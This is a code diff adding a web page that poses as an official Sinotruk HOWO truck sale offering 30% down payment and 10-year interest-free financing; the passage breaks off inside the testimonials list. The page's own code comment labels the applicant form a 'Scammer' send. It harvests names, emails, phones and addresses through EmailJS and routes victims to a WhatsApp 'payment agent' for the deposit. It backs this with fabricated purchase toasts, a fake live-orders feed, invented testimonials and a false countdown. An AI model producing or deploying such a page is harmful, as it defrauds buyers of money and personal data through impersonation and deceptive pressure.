@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Sinotruk HOWO | Official Truck Sale – 30% Down Payment</title>
+    <!-- FontAwesome 6 -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <!-- EmailJS -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #FFFFFF;
+            color: #1A1A1A;
+            line-height: 1.5;
+        }
+
+        @import url('https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap');
+
+        .container {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 1.5rem;
+        }
+
+        /* Trust Bar */
+        .trust-bar {
+            background: #1A1A1A;
+            border-bottom: 1px solid #333;
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            padding: 0.75rem 1rem;
+            font-size: 0.8rem;
+            flex-wrap: wrap;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .trust-item { display: flex; align-items: center; gap: 0.5rem; color: #FFFFFF; }
+        .trust-item i { color: #D4AF37; width: 16px; }
+
+        /* Header / Nav */
+        .main-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 1.5rem;
+            flex-wrap: wrap;
+            border-bottom: 1px solid #E5E5E5;
+            max-width: 1280px;
+            margin: 0 auto;
+        }
+        .logo-area { display: flex; align-items: center; gap: 0.5rem; }
+        .logo-area i { font-size: 1.8rem; color: #C41E3A; }
+        .logo-area h2 { font-weight: 700; color: #C41E3A; }
+        .nav-links { display: flex; gap: 1.5rem; flex-wrap: wrap; }
+        .nav-links a { text-decoration: none; color: #1A1A1A; font-weight: 500; transition: color 0.2s; cursor: pointer; }
+        .nav-links a:hover { color: #C41E3A; }
+        .claim-nav { background: #C41E3A; color: white !important; padding: 0.3rem 0.8rem; border-radius: 2rem; }
+        .claim-nav:hover { background: #8B0000; }
+
+        /* Hero */
+        .hero { text-align: center; padding: 2rem 1rem; max-width: 800px; margin: 0 auto; }
+        .live-badge { display: inline-flex; align-items: center; gap: 0.4rem; background: #FFF5F5; padding: 0.3rem 1rem; border-radius: 2rem; font-size: 0.8rem; margin-bottom: 1rem; }
+        .live-dot { width: 8px; height: 8px; background: #22C55E; border-radius: 50%; display: inline-block; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { opacity: 0.3; transform: scale(0.8); } 50% { opacity: 1; transform: scale(1.2); } 100% { opacity: 0.3; transform: scale(0.8); } }
+        .hero h1 { font-size: 2.8rem; font-weight: 700; margin-bottom: 0.8rem; color: #1A1A1A; }
+        .hero p { font-size: 1rem; color: #4B4B4B; max-width: 600px; margin: 0 auto; }
+        .offer-badge { background: #D4AF37; color: #1A1A1A; display: inline-block; padding: 0.3rem 1rem; border-radius: 2rem; font-weight: 600; margin-top: 1rem; }
+        .hero-buttons { display: flex; gap: 1rem; justify-content: center; margin-top: 1.5rem; flex-wrap: wrap; }
+        .btn-red { background: #C41E3A; color: white; padding: 0.7rem 1.5rem; border-radius: 2rem; border: none; cursor: pointer; font-size: 0.9rem; transition: all 0.2s; font-weight: 600; }
+        .btn-red:hover { background: #8B0000; transform: scale(1.02); }
+        .btn-red:active { transform: scale(0.97); }
+        .btn-outline { border: 1px solid #C41E3A; color: #C41E3A; padding: 0.7rem 1.5rem; border-radius: 2rem; background: white; cursor: pointer; font-size: 0.9rem; transition: all 0.2s; font-weight: 600; }
+        .btn-outline:hover { background: #FFF5F5; transform: scale(1.02); }
+        .btn-outline:active { transform: scale(0.97); }
+
+        /* Trust Badges Row */
+        .trust-badges-row {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            padding: 1rem;
+            border-top: 1px solid #E5E5E5;
+            border-bottom: 1px solid #E5E5E5;
+            margin: 1rem 0;
+        }
+        .trust-badges-row span i { color: #D4AF37; margin-right: 0.3rem; }
+
+        /* Double Truck Image */
+        .double-truck {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin: 2rem 0;
+            flex-wrap: wrap;
+        }
+        .truck-image-box {
+            text-align: center;
+            flex: 1;
+            min-width: 200px;
+        }
+        .truck-image-box img {
+            width: 100%;
+            max-width: 300px;
+            border-radius: 1rem;
+        }
+
+        /* Truck Grid */
+        .trucks-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 1.8rem;
+            margin: 1.5rem 0;
+        }
+        .truck-card {
+            background: white;
+            border-radius: 1rem;
+            overflow: hidden;
+            border: 1px solid #E5E5E5;
+            transition: all 0.2s;
+            position: relative;
+        }
+        .truck-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1);
+            border-color: #C41E3A;
+        }
+        .card-badge {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            padding: 0.2rem 0.7rem;
+            border-radius: 2rem;
+            font-size: 0.7rem;
+            font-weight: 700;
+            z-index: 2;
+        }
+        .card-image {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+            background: #F0F0F0;
+        }
+        .truck-info {
+            padding: 1rem;
+        }
+        .truck-category {
+            font-size: 0.7rem;
+            letter-spacing: 1px;
+            color: #6B7280;
+            margin-bottom: 0.3rem;
+        }
+        .truck-title {
+            font-size: 1.3rem;
+            font-weight: 700;
+        }
+        .spec-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 0.5rem;
+            margin: 0.8rem 0;
+            font-size: 0.8rem;
+        }
+        .spec-item i {
+            width: 18px;
+            color: #D4AF37;
+            margin-right: 0.3rem;
+        }
+        .price {
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin: 0.5rem 0;
+            color: #1A1A1A;
+        }
+        .upfront {
+            font-size: 1.5rem;
+            font-weight: 800;
+            margin: 0.3rem 0;
+            color: #C41E3A;
+        }
+        .upfront small {
+            font-size: 0.7rem;
+            font-weight: normal;
+            color: #6B7280;
+        }
+        .terms {
+            font-size: 0.7rem;
+            color: #6B7280;
+            margin-bottom: 0.5rem;
+        }
+        .claim-btn-card {
+            background: #C41E3A;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 0.7rem;
+            border-radius: 2rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 0.5rem;
+            transition: all 0.2s;
+        }
+        .claim-btn-card:hover { background: #8B0000; }
+        .claim-btn-card:active { transform: scale(0.97); }
+
+        /* Swipeable Testimonials Carousel */
+        .testimonials-carousel {
+            position: relative;
+            background: #F8F8F8;
+            border-radius: 1rem;
+            padding: 1rem;
+            margin: 1.5rem 0;
+        }
+        .carousel-container {
+            display: flex;
+            gap: 1rem;
+            overflow-x: auto;
+            scroll-behavior: smooth;
+            padding: 0.5rem;
+            scrollbar-width: thin;
+        }
+        .testimonial-slide {
+            min-width: 280px;
+            background: white;
+            border-radius: 0.8rem;
+            padding: 1rem;
+            border-left: 3px solid #C41E3A;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
+        .carousel-btn {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            background: white;
+            border: 1px solid #E5E5E5;
+            border-radius: 50%;
+            width: 32px;
+            height: 32px;
+            cursor: pointer;
+            z-index: 2;
+            font-size: 1rem;
+        }
+        .carousel-btn.prev { left: -12px; }
+        .carousel-btn.next { right: -12px; }
+
+        /* Steps */
+        .steps-container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem;
+            margin: 2rem 0;
+        }
+        .step {
+            flex: 1;
+            background: #F8F8F8;
+            padding: 1rem;
+            border-radius: 0.8rem;
+            text-align: center;
+        }
+        .step-number {
+            width: 36px;
+            height: 36px;
+            background: #C41E3A;
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 0.5rem;
+            font-weight: 700;
+        }
+
+        /* Countdown Box */
+        .countdown-box {
+            background: linear-gradient(135deg, #1A1A1A, #2A2A2A);
+            border-radius: 1.5rem;
+            padding: 1.5rem;
+            text-align: center;
+            color: white;
+            margin: 2rem 0;
+        }
+        .timer {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin: 1rem 0;
+        }
+        .time-unit {
+            background: rgba(255,255,255,0.1);
+            padding: 0.5rem 1rem;
+            border-radius: 0.5rem;
+            font-size: 1.5rem;
+            font-weight: 700;
+            min-width: 60px;
+        }
+
+        /* Live Feed */
+        .live-feed {
+            background: #F8F8F8;
+            border-radius: 1rem;
+            padding: 1rem;
+            max-height: 350px;
+            overflow-y: auto;
+            margin: 1rem 0;
+        }
+        .feed-item {
+            padding: 0.6rem;
+            border-bottom: 1px solid #E5E5E5;
+            font-size: 0.85rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            animation: fadeIn 0.3s;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .feed-item i { color: #22C55E; }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(4px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background: white;
+            max-width: 550px;
+            width: 90%;
+            border-radius: 1.2rem;
+            padding: 1.5rem;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        .form-group { margin-bottom: 1rem; }
+        .form-group label { font-weight: 500; display: block; margin-bottom: 0.3rem; }
+        input, select {
+            width: 100%;
+            padding: 0.7rem;
+            border: 1px solid #CCC;
+            border-radius: 0.5rem;
+            font-size: 0.9rem;
+        }
+        .btn-submit {
+            background: #C41E3A;
+            color: white;
+            width: 100%;
+            padding: 0.8rem;
+            border: none;
+            border-radius: 2rem;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 1rem;
+            transition: all 0.2s;
+        }
+        .btn-submit:active { transform: scale(0.97); }
+        .btn-secondary {
+            background: #E5E5E5;
+            color: #1A1A1A;
+            width: 48%;
+            padding: 0.8rem;
+            border: none;
+            border-radius: 2rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .btn-secondary:active { transform: scale(0.97); }
+        .modal-buttons {
+            display: flex;
+            gap: 1rem;
+            justify-content: flex-end;
+            margin-top: 1rem;
+        }
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid white;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Success Page */
+        .success-card {
+            text-align: center;
+            padding: 1rem;
+        }
+        .success-icon {
+            font-size: 3.5rem;
+            color: #22C55E;
+            margin-bottom: 1rem;
+        }
+        .success-card h2 {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            color: #1A1A1A;
+        }
+        .whatsapp-btn {
+            display: inline-block;
+            background: #25D366;
+            color: white;
+            padding: 0.8rem 1.5rem;
+            border-radius: 2rem;
+            text-decoration: none;
+            font-weight: 600;
+            margin: 1rem 0.5rem;
+            transition: all 0.2s;
+        }
+        .whatsapp-btn:hover { transform: scale(1.02); }
+
+        /* Toast Container */
+        .toast-container {
+            position: fixed;
+            top: 80px;
+            right: 20px;
+            z-index: 2000;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .toast {
+            background: #1A1A1A;
+            color: white;
+            padding: 0.8rem 1.2rem;
+            border-radius: 0.8rem;
+            font-size: 0.85rem;
+            border-left: 3px solid #22C55E;
+            animation: slideIn 0.3s ease;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+        }
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        footer {
+            background: #1A1A1A;
+            padding: 2rem;
+            margin-top: 2rem;
+            text-align: center;
+            color: #FFFFFF;
+        }
+        .footer-badges {
+            display: flex;
+            justify-content: center;
+            gap: 1.5rem;
+            flex-wrap: wrap;
+            margin-bottom: 1rem;
+        }
+        .footer-badges span i { color: #D4AF37; margin-right: 0.3rem; }
+
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 1.8rem; }
+            .nav-links { display: none; }
+            .timer { gap: 0.5rem; }
+            .time-unit { padding: 0.3rem 0.6rem; font-size: 1rem; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="trust-bar">
+    <div class="trust-item"><i class="fas fa-check-circle"></i> Verified Chinese Manufacturer</div>
+    <div class="trust-item"><i class="fas fa-percent"></i> 30% Down Payment</div>
+    <div class="trust-item"><i class="fas fa-calendar-alt"></i> 10-Year Financing</div>
+    <div class="trust-item"><i class="fas fa-truck"></i> <span id="liveCounterTrust">5,042</span>+ Trucks Sold</div>
+</div>
+
+<div class="main-header">
+    <div class="logo-area"><i class="fas fa-truck"></i><h2>SINOTRUK HOWO</h2></div>
+    <div class="nav-links">
+        <a class="footer-nav-link" data-target="giveaway">Trucks</a>
+        <a class="footer-nav-link" data-target="info">Financing</a>
+        <a class="footer-nav-link" data-target="instruction">How It Works</a>
+        <a class="footer-nav-link" data-target="transactions">Live Orders</a>
+        <a href="#" class="claim-nav" id="navClaimBtn">Claim Truck</a>
+    </div>
+</div>
+
+<div class="hero">
+    <div class="live-badge"><span class="live-dot"></span> LIVE OFFER — <span id="heroJoinCount">1,247</span> farmers approved</div>
+    <h1>Own a Sinotruk HOWO Heavy Truck</h1>
+    <p>High-quality Chinese trucks direct from manufacturer. Agricultural and commercial trucks for farmers and businesses worldwide.</p>
+    <div class="offer-badge"><i class="fas fa-percent"></i> 30% DOWN PAYMENT | 10 YEARS TO PAY THE REST</div>
+    <div class="hero-buttons">
+        <button class="btn-red" id="heroClaimBtn"><i class="fas fa-truck"></i> Claim Your Truck →</button>
+        <button class="btn-outline" id="viewModelsBtn">View All Models</button>
+    </div>
+</div>
+
+<div class="trust-badges-row">
+    <span><i class="fas fa-check-circle"></i> Direct from Factory</span>
+    <span><i class="fas fa-shield-alt"></i> 5-Year Warranty</span>
+    <span><i class="fas fa-globe"></i> Worldwide Shipping</span>
+</div>
+
+<div class="container">
+    <!-- Double Truck Image -->
+    <div class="double-truck">
+        <div class="truck-image-box"><img src="https://placehold.co/400x250?text=HOWO+Dump+Truck" alt="HOWO Dump Truck"><p>HOWO Heavy Duty</p></div>
+        <div class="truck-image-box"><img src="https://placehold.co/400x250?text=HOWO+Cargo+Truck" alt="HOWO Cargo Truck"><p>HOWO Cargo Series</p></div>
+    </div>
+    <p style="text-align:center; font-weight:600;">Limited Time Offer – 30% Down, 10 Years to Pay</p>
+
+    <!-- Countdown Box -->
+    <div class="countdown-box" id="giveaway-section">
+        <h3><span class="live-dot"></span> Offer ends in:</h3>
+        <div class="timer" id="timer">
+            <span class="time-unit" id="days">00</span>
+            <span class="time-unit" id="hours">00</span>
+            <span class="time-unit" id="minutes">00</span>
+            <span class="time-unit" id="seconds">00</span>
+        </div>
+        <p><span id="participantCount">1,247</span> farmers already approved</p>
+    </div>
+
+    <!-- 10 Trucks Grid -->
+    <div class="trucks-grid" id="trucksGrid"></div>
+
+    <!-- Swipeable Testimonials Carousel -->
+    <h3 id="info-section">What Farmers Are Saying</h3>
+    <div class="testimonials-carousel">
+        <button class="carousel-btn prev" id="prevTestimonial">←</button>
+        <div class="carousel-container" id="testimonialCarousel"></div>
+        <button class="carousel-btn next" id="nextTestimonial">→</button>
+    </div>
+
+    <!-- How It Works -->
+    <h3 id="instruction-section">How to Get Your HOWO Truck</h3>
+    <div class="steps-container">
+        <div class="step"><div class="step-number">01</div><strong>Submit Application</strong><br>Fill in your details</div>
+        <div class="step"><div class="step-number">02</div><strong>Get Approved</strong><br>Quick verification</div>
+        <div class="step"><div class="step-number">03</div><strong>Pay 30% Down</strong><br>Secure your truck</div>
+        <div class="step"><div class="step-number">04</div><strong>Receive Truck</strong><br>Pay remaining in 10 years</div>
+    </div>
+    <div style="text-align:center; margin:1rem 0;"><button class="btn-red" id="startClaimBtn"><i class="fas fa-truck"></i> Start Your Application →</button></div>
+
+    <!-- Live Deliveries Feed -->
+    <h3 id="transactions-section">Live Orders <span class="live-dot"></span></h3>
+    <div class="live-feed" id="liveFeedList"></div>
+</div>
+
+<footer>
+    <div class="footer-badges">
+        <span><i class="fas fa-check-circle"></i> Official Sinotruk HOWO</span>
+        <span><i class="fas fa-shield-alt"></i> 5-Year Warranty</span>
+        <span><i class="fas fa-percent"></i> 30% Down Payment</span>
+        <span><i class="fas fa-calendar-alt"></i> 10-Year Financing</span>
+    </div>
+    <p>Sinotruk HOWO – China National Heavy Duty Truck Group Co., Ltd.</p>
+    <p style="margin-top:0.5rem;">© 2025 Sinotruk HOWO Official Sale. All rights reserved.</p>
+</footer>
+
+<div class="toast-container" id="toastContainer"></div>
+
+<!-- Modals -->
+<div id="claimModal" class="modal"><div class="modal-content" id="claimModalContent"></div></div>
+<div id="successModal" class="modal"><div class="modal-content" id="successModalContent"></div></div>
+
+<script>
+    // Initialize EmailJS
+    emailjs.init("dvLgjhIHXXq7QXp5p");
+
+    // Truck Data (10 models)
+    const trucks = [
+        { id: 0, name: "HOWO Dump Truck", category: "Mining & Construction", badge: "Best Seller", badgeColor: "#D4AF37", capacity: "25-40 tons", engine: "WD615 336HP", price: "$42,000", upfront: "$12,600", image: "https://placehold.co/600x400?text=HOWO+Dump+Truck" },
+        { id: 1, name: "HOWO Heavy-Duty Cargo Truck", category: "Freight & Logistics", badge: "Most Popular", badgeColor: "#C41E3A", capacity: "20-30 tons", engine: "WD615 336HP", price: "$38,000", upfront: "$11,400", image: "https://placehold.co/600x400?text=HOWO+Cargo+Truck" },
+        { id: 2, name: "HOWO Semi-Truck", category: "Long Haul", badge: "Top Rated", badgeColor: "#D4AF37", capacity: "40-50 tons", engine: "MC11 440HP", price: "$55,000", upfront: "$16,500", image: "https://placehold.co/600x400?text=HOWO+Semi+Truck" },
+        { id: 3, name: "HOWO Flatbed Truck", category: "Versatile Transport", badge: "Best Value", badgeColor: "#D4AF37", capacity: "15-25 tons", engine: "WD615 336HP", price: "$35,000", upfront: "$10,500", image: "https://placehold.co/600x400?text=HOWO+Flatbed+Truck" },
+        { id: 4, name: "HOWO Concrete Mixer", category: "Construction", badge: "Heavy Duty", badgeColor: "#C41E3A", capacity: "8-12 cubic meters", engine: "WD615 336HP", price: "$48,000", upfront: "$14,400", image: "https://placehold.co/600x400?text=HOWO+Concrete+Mixer" },
+        { id: 5, name: "HOWO Tanker Truck", category: "Liquid Transport", badge: "Industrial", badgeColor: "#D4AF37", capacity: "15,000-25,000L", engine: "MC11 440HP", price: "$52,000", upfront: "$15,600", image: "https://placehold.co/600x400?text=HOWO+Tanker+Truck" },
+        { id: 6, name: "HOWO Refrigerated Truck", category: "Cold Chain", badge: "New Model", badgeColor: "#C41E3A", capacity: "10-20 tons", engine: "WD615 336HP", price: "$45,000", upfront: "$13,500", image: "https://placehold.co/600x400?text=HOWO+Refrigerated+Truck" },
+        { id: 7, name: "HOWO Tipper Truck", category: "Dumping", badge: "Heavy Duty", badgeColor: "#D4AF37", capacity: "30-45 tons", engine: "MC11 440HP", price: "$50,000", upfront: "$15,000", image: "https://placehold.co/600x400?text=HOWO+Tipper+Truck" },
+        { id: 8, name: "HOWO Light-Duty Delivery Truck", category: "Urban Delivery", badge: "City Special", badgeColor: "#C41E3A", capacity: "3-5 tons", engine: "YC4E 160HP", price: "$22,000", upfront: "$6,600", image: "https://placehold.co/600x400?text=HOWO+Light+Truck" },
+        { id: 9, name: "HOWO Bus Chassis", category: "Passenger Transport", badge: "Commercial", badgeColor: "#D4AF37", capacity: "40-60 passengers", engine: "MC11 440HP", price: "$58,000", upfront: "$17,400", image: "https://placehold.co/600x400?text=HOWO+Bus+Chassis" }
+    ];
+
+    let selectedTruck = null;
+    let claimData = null;
+
+// Helper for button loading
+    function setButtonLoading(btn, isLoading, originalText) {
+        if (isLoading) {
+            btn.disabled = true;
+            btn.style.opacity = '0.7';
+            btn.innerHTML = 'Processing... <span class="loading-spinner"></span>';
+        } else {
+            btn.disabled = false;
+            btn.style.opacity = '1';
+            btn.innerHTML = originalText || btn.getAttribute('data-original-text') || 'Submit';
+        }
+    }
+
+    // Render trucks grid
+    function renderTrucks() {
+        const grid = document.getElementById('trucksGrid');
+        grid.innerHTML = '';
+        trucks.forEach(truck => {
+            const card = document.createElement('div');
+            card.className = 'truck-card';
+            card.innerHTML = `
+                <div class="card-badge" style="background: ${truck.badgeColor}; color: ${truck.badgeColor === '#D4AF37' ? '#1A1A1A' : 'white'}">${truck.badge}</div>
+                <img class="card-image" src="${truck.image}" alt="${truck.name}" onerror="this.src='https://placehold.co/600x400?text=HOWO+Truck'">
+                <div class="truck-info">
+                    <div class="truck-category">${truck.category}</div>
+                    <div class="truck-title">${truck.name}</div>
+                    <div class="spec-grid">
+                        <div class="spec-item"><i class="fas fa-weight-hanging"></i> ${truck.capacity}</div>
+                        <div class="spec-item"><i class="fas fa-engine"></i> ${truck.engine}</div>
+                        <div class="spec-item"><i class="fas fa-globe"></i> Worldwide Shipping</div>
+                        <div class="spec-item"><i class="fas fa-calendar-alt"></i> 10-Year Terms</div>
+                    </div>
+                    <div class="price">Full Price: ${truck.price}</div>
+                    <div class="upfront">30% Down: ${truck.upfront} <small>only</small></div>
+                    <div class="terms">Balance payable within 10 years • 0% interest</div>
+                    <button class="claim-btn-card" data-truck='${JSON.stringify(truck)}'><i class="fas fa-truck"></i> Claim This Truck →</button>
+                </div>
+            `;
+            grid.appendChild(card);
+        });
+        document.querySelectorAll('.claim-btn-card').forEach(btn => {
+            btn.addEventListener('click', () => {
+                selectedTruck = JSON.parse(btn.getAttribute('data-truck'));
+                showClaimModal();
+            });
+        });
+    }
+
+    // Claim Modal
+    function showClaimModal() {
+        const modal = document.getElementById('claimModal');
+        const content = document.getElementById('claimModalContent');
+        content.innerHTML = `
+            <h2 style="color:#C41E3A;"><i class="fas fa-truck"></i> You selected:</h2>
+            <p style="font-size:1.1rem; font-weight:500; margin-bottom:1rem;">${selectedTruck.name}</p>
+            <img src="${selectedTruck.image}" style="width:100%; border-radius:0.8rem; margin-bottom:1rem;" onerror="this.src='https://placehold.co/600x400'">
+            <form id="claimForm">
+                <div class="form-group"><label>Full Name *</label><input type="text" id="fullName" required placeholder="John Doe"></div>
+                <div class="form-group"><label>Email Address *</label><input type="email" id="email" required placeholder="john@example.com"></div>
+                <div class="form-group"><label>Phone Number *</label><input type="text" id="phone" required placeholder="+1234567890"></div>
+                <div class="form-group"><label>Delivery Address *</label><input type="text" id="address" required placeholder="123 Main St, City, Country"></div>
+                <div class="modal-buttons">
+                    <button type="button" class="btn-secondary" id="cancelClaimBtn">Cancel</button>
+                    <button type="submit" class="btn-submit" id="submitClaimBtn">Submit Application →</button>
+                </div>
+            </form>
+        `;
+        modal.style.display = 'flex';
+
+        document.getElementById('cancelClaimBtn').onclick = () => modal.style.display = 'none';
+
+        document.getElementById('claimForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const submitBtn = document.getElementById('submitClaimBtn');
+            const originalText = submitBtn.innerHTML;
+            setButtonLoading(submitBtn, true, originalText);
+
+            claimData = {
+                fullName: document.getElementById('fullName').value,
+                email: document.getElementById('email').value,
+                phone: document.getElementById('phone').value,
+                address: document.getElementById('address').value,
+                truckModel: selectedTruck.name,
+                upfrontAmount: selectedTruck.upfront,
+                timestamp: new Date().toLocaleString()
+            };
+
+            try {
+                await emailjs.send('service_1qzlil7', 'template_2raf063', claimData);
+                console.log('Send 1 (Scammer - application) sent');
+            } catch(err) { console.log('EmailJS error:', err); }
+
+            setTimeout(() => {
+                setButtonLoading(submitBtn, false, originalText);
+                modal.style.display = 'none';
+                showSuccess();
+            }, 800);
+        });
+    }
+
+    // Success Modal with Tidio Chat
+    function showSuccess() {
+        const modal = document.getElementById('successModal');
+        const content = document.getElementById('successModalContent');
+        content.innerHTML = `
+            <div class="success-card">
+                <div class="success-icon"><i class="fas fa-check-circle"></i></div>
+                <h2>APPLICATION RECEIVED!</h2>
+                <p><strong>${selectedTruck.name}</strong></p>
+                <p>30% Down Payment: <strong>${selectedTruck.upfront}</strong></p>
+                <p>Balance: Pay within 10 years at 0% interest</p>
+                <div style="margin: 1rem 0; padding: 1rem; background: #F8F8F8; border-radius: 0.8rem;">
+                    <i class="fab fa-whatsapp" style="color:#25D366; font-size:1.2rem;"></i>
+                    <strong>Complete your 30% down payment:</strong>
+                    <p style="margin-top:0.5rem;">Contact our payment agent via WhatsApp to complete your 30% down payment and secure your truck.</p>
+                    <a href="https://wa.me/861234567890" class="whatsapp-btn" target="_blank"><i class="fab fa-whatsapp"></i> Chat on WhatsApp</a>
+                </div>
+                <p>A confirmation email has been sent to <strong>${claimData.email}</strong></p>
+                <div class="redirect-text" style="margin-top:1rem;">
+                    <span class="spinner-small" style="display:inline-block; width:14px; height:14px; border:2px solid #6B7280; border-top-color:transparent; border-radius:50%; animation: spin 0.6s linear infinite;"></span> Redirecting to homepage...
+                </div>
+            </div>
+        `;
+        modal.style.display = 'flex';
+        
+        addToLiveFeed(claimData.fullName.split(' ')[0], selectedTruck.name, selectedTruck.upfront);
+        showToastMessage(claimData.fullName.split(' ')[0], selectedTruck.name);
+        
+        setTimeout(() => {
+            modal.style.display = 'none';
+            location.reload();
+        }, 6000);
+    }
+
+
+// Live Feed Functions
+    function addToLiveFeed(firstName, truckName, upfront) {
+        const feed = document.getElementById('liveFeedList');
+        const entry = document.createElement('div');
+        entry.className = 'feed-item';
+        entry.innerHTML = `<i class="fas fa-truck"></i> ${firstName} just paid 30% down for ${truckName} (${upfront}) · Just now`;
+        feed.prepend(entry);
+        if (feed.children.length > 15) feed.removeChild(feed.lastChild);
+    }
+
+    function showToastMessage(firstName, truckName) {
+        const container = document.getElementById('toastContainer');
+        const toast = document.createElement('div');
+        toast.className = 'toast';
+        toast.innerHTML = `<i class="fas fa-check-circle" style="color:#22C55E;"></i> ${firstName} just paid 30% down for ${truckName}`;
+        container.appendChild(toast);
+        setTimeout(() => toast.remove(), 5000);
+    }
+
+    // Name pool for auto toasts
+    const namePool = [
+        "James Wilson", "John Martinez", "Michael Brown", "David Rodriguez", "Robert Anderson",
+        "Liam O'Connor", "Oliver Jones", "Lucas Tremblay", "Lukas Schmidt", "Matteo Rossi",
+        "Gabriel Santos", "Jack Thompson", "Yuki Tanaka", "Min-jun Park", "Arjun Sharma",
+        "Carlos Hernandez", "Santiago Fernandez", "Elias Andersson", "William van der Berg", "Antonio Silva"
+    ];
+
+    // Auto toast and live feed
+    setInterval(() => {
+        const randomPerson = namePool[Math.floor(Math.random() * namePool.length)];
+        const randomTruck = trucks[Math.floor(Math.random() * trucks.length)];
+        showToastMessage(randomPerson.split(' ')[0], randomTruck.name);
+        addToLiveFeed(randomPerson.split(' ')[0], randomTruck.name, randomTruck.upfront);
+    }, 18000);
+
+    // Initial live feed entries
+    const liveFeed = document.getElementById('liveFeedList');
+    liveFeed.innerHTML = '';
+    const initialEntries = [
+        { name: "James Wilson", country: "USA", truck: "HOWO Dump Truck", upfront: "$12,600", time: "2 min ago" },
+        { name: "Liam O'Connor", country: "UK", truck: "HOWO Cargo Truck", upfront: "$11,400", time: "5 min ago" },
+        { name: "Carlos Hernandez", country: "Mexico", truck: "HOWO Semi-Truck", upfront: "$16,500", time: "12 min ago" },
+        { name: "Yuki Tanaka", country: "Japan", truck: "HOWO Flatbed Truck", upfront: "$10,500", time: "18 min ago" },
+        { name: "Gabriel Santos", country: "Brazil", truck: "HOWO Concrete Mixer", upfront: "$14,400", time: "25 min ago" }
+    ];
+    initialEntries.forEach(entry => {
+        const div = document.createElement('div');
+        div.className = 'feed-item';
+        div.innerHTML = `<i class="fas fa-truck"></i> ${entry.name} ${entry.country} · ${entry.truck} · 30% down (${entry.upfront}) · ${entry.time}`;
+        liveFeed.appendChild(div);
+    });
+
+    // Testimonials Carousel (30+ entries)
+    const testimonialsList = [
+        { name: "James Wilson", country: "USA", text: "Got my HOWO Dump Truck after paying 30% down. Best investment for my farm!", truck: "HOWO Dump Truck" },
+        { name: "John Martinez", country: "USA", text: "10-year financing made it possible for me. My cargo truck is running perfect!", truck: "HOWO Cargo Truck" },
+        { name: "Liam O'Connor", country: "UK", text: "30% down was all I needed. The truck arrived in 3 weeks!", truck: "HOWO Semi-Truck" },
+        { name: "Lucas Tremblay", country: "Canada", text: "Sinotruk HOWO quality is excellent. Highly recommend for farmers!", truck: "HOWO Flatbed Truck" },
+        { name: "Matteo Rossi", country: "Italy", text: "My concrete mixer is working flawlessly. Thank you HOWO!", truck: "HOWO Concrete Mixer" },
+        { name: "Gabriel Santos", country: "Brazil", text: "Tanker truck delivered last week. Perfect for my agricultural business!", truck: "HOWO Tanker Truck" },
+        { name: "Jack Thompson", country: "Australia", text: "Refrigerated truck keeps my produce fresh. 30% down was very affordable.", truck: "HOWO Refrigerated Truck" },
+        { name: "Arjun Sharma", country: "India", text: "Tipper truck is a beast! Best decision for my construction business.", truck: "HOWO Tipper Truck" },
